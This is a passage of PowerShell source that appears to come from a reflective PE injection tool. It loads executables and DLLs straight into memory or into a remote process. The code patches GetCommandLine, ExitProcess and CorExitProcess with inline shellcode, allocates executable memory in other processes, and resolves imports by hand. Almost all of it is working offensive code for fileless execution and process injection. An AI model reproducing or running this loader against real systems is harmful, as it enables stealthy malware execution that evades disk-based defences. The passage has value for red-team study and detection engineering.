                        $LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
					}
					else
					{
				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
        #ASLR check
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
